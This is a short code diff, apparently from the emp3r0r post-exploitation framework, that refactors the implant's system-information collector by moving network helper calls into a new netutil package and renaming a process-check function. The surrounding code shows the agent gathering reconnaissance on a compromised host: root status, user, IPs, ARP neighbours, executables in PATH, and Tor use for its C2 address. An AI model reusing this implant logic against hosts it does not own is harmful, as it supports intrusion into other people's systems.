@@ -12,6 +12,7 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/common"
 	"github.com/jm33-m0/emp3r0r/core/internal/def"
 	"github.com/jm33-m0/emp3r0r/core/internal/transport"
+	"github.com/jm33-m0/emp3r0r/core/lib/netutil"
 	"github.com/jm33-m0/emp3r0r/core/lib/sysinfo"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
@@ -59,7 +60,7 @@ func CollectSystemInfo() *def.Emp3r0rAgent {
 	info.HasRoot = sysinfo.HasRoot()
 
 	// process
-	info.Process = CheckAgentProcess()
+	info.Process = GetAgentProcess()
 
 	// user account info
 	u, err := user.Current()
@@ -70,7 +71,7 @@ func CollectSystemInfo() *def.Emp3r0rAgent {
 	info.User = fmt.Sprintf("%s (%s), uid=%s, gid=%s", u.Username, u.HomeDir, u.Uid, u.Gid)
 
 	// is cc on tor?
-	info.HasTor = transport.IsTor(def.CCAddress)
+	info.HasTor = netutil.IsTor(def.CCAddress)
 
 	// has internet?
 	if common.RuntimeConfig.EnableNCSI {
@@ -82,10 +83,10 @@ func CollectSystemInfo() *def.Emp3r0rAgent {
 	}
 
 	// IP address?
-	info.IPs = transport.IPa()
+	info.IPs = netutil.IPa()
 
 	// arp -a ?
-	info.ARP = transport.IPNeigh()
+	info.ARP = netutil.IPNeigh()
 
 	// exes in PATH
 	info.Exes = util.ScanPATH()
